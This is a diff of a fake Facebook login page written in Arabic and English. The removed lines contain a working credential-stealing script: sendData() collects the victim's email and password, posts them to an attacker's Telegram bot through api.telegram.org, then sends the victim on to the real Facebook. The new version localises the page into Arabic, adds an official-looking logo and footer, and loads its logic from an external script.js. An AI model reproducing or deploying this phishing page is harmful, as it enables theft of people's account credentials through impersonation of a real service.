@@ -1,157 +1,30 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Facebook Login</title>
-<style>
-    /* إعدادات الصفحة العامة */
-    body {
-        font-family: Arial, sans-serif;
-        background-color: #e9ebee;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        min-height: 100vh;
-        margin: 0;
-    }
-
-    /* تنسيق حاوية تسجيل الدخول */
-    .login-container {
-        width: 100%;
-        max-width: 380px;
-        padding: 20px;
-        background-color: #fff;
-        border-radius: 8px;
-        box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
-        text-align: center;
-    }
-
-    /* الشعار */
-    .login-container h1 {
-        color: #1877f2;
-        font-size: 30px;
-        margin-bottom: 20px;
-    }
-
-    /* حقول الإدخال */
-    .input-field {
-        width: 100%;
-        padding: 12px;
-        margin: 10px 0;
-        border: 1px solid #ddd;
-        border-radius: 4px;
-        font-size: 16px;
-        box-sizing: border-box;
-    }
-
-    /* زر تسجيل الدخول */
-    .login-button {
-        width: 100%;
-        padding: 12px;
-        background-color: #1877f2;
-        color: #fff;
-        border: none;
-        border-radius: 4px;
-        font-size: 18px;
-        font-weight: bold;
-        cursor: pointer;
-    }
-
-    /* رابط التسجيل وإنشاء الحساب */
-    .create-account {
-        color: #1877f2;
-        font-size: 14px;
-        font-weight: bold;
-        display: block;
-        margin: 20px 0;
-        text-decoration: none;
-    }
-    
-    /* الخط الفاصل */
-    .divider {
-        margin: 15px 0;
-        position: relative;
-        text-align: center;
-    }
-
-    .divider::before,
-    .divider::after {
-        content: "";
-        position: absolute;
-        top: 50%;
-        width: 40%;
-        height: 1px;
-        background-color: #ddd;
-    }
-
-    .divider::before {
-        left: 0;
-    }
-
-    .divider::after {
-        right: 0;
-    }
-
-    .divider span {
-        padding: 0 10px;
-        background-color: #fff;
-        font-size: 12px;
-        color: #777;
-    }
-
-    /* استجابة للأجهزة الصغيرة */
-    @media (max-width: 600px) {
-        .login-container {
-            width: 90%;
-            max-width: 350px;
-        }
-
-        .login-container h1 {
-            font-size: 28px;
-        }
-    }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="تسجيل الدخول إلى Facebook.">
+  <title>تسجيل الدخول إلى Facebook</title>
+  <link rel="stylesheet" href="styles.css">
 </head>
 <body>
 
 <div class="login-container">
-    <h1>Facebook</h1>
-    <input type="text" id="email" class="input-field" placeholder="Email or Phone Number">
-    <input type="password" id="password" class="input-field" placeholder="Password">
-    <button class="login-button" onclick="sendData()">Log In</button>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="logo">
+    <input type="text" id="email" class="input-field" placeholder="البريد الإلكتروني أو رقم الهاتف">
+    <input type="password" id="password" class="input-field" placeholder="كلمة المرور">
+    <button class="login-button" onclick="sendData()">تسجيل الدخول</button>
 
-    <div class="divider"><span>or</span></div>
+    <div class="divider"><span>أو</span></div>
 
-    <a href="#" class="create-account">Create New Account</a>
+    <a href="#" class="create-account">إنشاء حساب جديد</a>
 </div>
 
-<script>
-    // لا تستخدم الـ token والـ chat ID في الجافا سكريبت هنا مباشرة
-    const botToken = "YOUR_BOT_TOKEN";  // ضع التوكن هنا
-    const chatId = "YOUR_CHAT_ID";      // ضع الـ chat ID هنا
+<footer>
+    <p>© 2024 Facebook</p>
+</footer>
 
-    function sendData() {
-        const email = document.getElementById("email").value;
-        const password = document.getElementById("password").value;
-
-        const message = `New Login:\nEmail: ${email}\nPassword: ${password}`;
-
-        // تأكد من إرسال البيانات إلى الخادم الخلفي بدلاً من الكشف عنها في المتصفح
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-            .then(response => {
-                if (response.ok) {
-                    window.location.href = "https://www.facebook.com/";  // إعادة توجيه المستخدم إلى Facebook
-                } else {
-                    alert("حدث خطأ أثناء الإرسال.");
-                }
-            })
-            .catch(error => {
-                console.error("Error:", error);
-                alert("حدث خطأ أثناء الإرسال.");
-            });
-    }
-</script>
+<script src="script.js"></script>
 
 </body>
 </html>
